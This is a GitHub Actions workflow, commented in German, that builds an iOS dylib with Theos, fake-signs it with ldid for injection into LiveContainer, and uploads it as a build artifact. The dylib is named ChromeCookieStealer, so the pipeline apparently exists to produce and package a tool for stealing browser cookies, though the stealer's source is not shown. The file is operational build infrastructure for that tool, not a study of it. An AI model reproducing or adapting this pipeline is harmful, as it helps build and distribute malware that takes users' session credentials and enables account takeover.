name: Build dylib

on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]

jobs:
  build:
    runs-on: macos-latest  # Der Gamechanger – alles native

    steps:
      - name: Checkout Repo
        uses: actions/checkout@v4

      - name: Install ldid (für Fake-Sign)
        run: brew install ldid

      - name: Install Theos
        run: |
          git clone https://github.com/theos/theos.git $HOME/theos
          echo "THEOS=$HOME/theos" >> $GITHUB_ENV
          echo "$HOME/theos/bin" >> $GITHUB_PATH

      - name: Update Theos (vendor fix + latest)
        run: $THEOS/bin/update-theos

      - name: Download latest iOS SDKs
        run: |
          curl -L https://github.com/theos/sdks/tarball/master | tar -xz -C $THEOS/sdks --strip-components=1

      - name: Build dylib
        run: |
          make clean
          make

      - name: Fake-Sign dylib (muss für Injection in LiveContainer)
        run: |
          ldid -S obj/ChromeCookieStealer.dylib

      - name: Upload dylib als Artifact
        uses: actions/upload-artifact@v4
        with:
          name: ChromeCookieStealer.dylib
          path: obj/ChromeCookieStealer.dylib
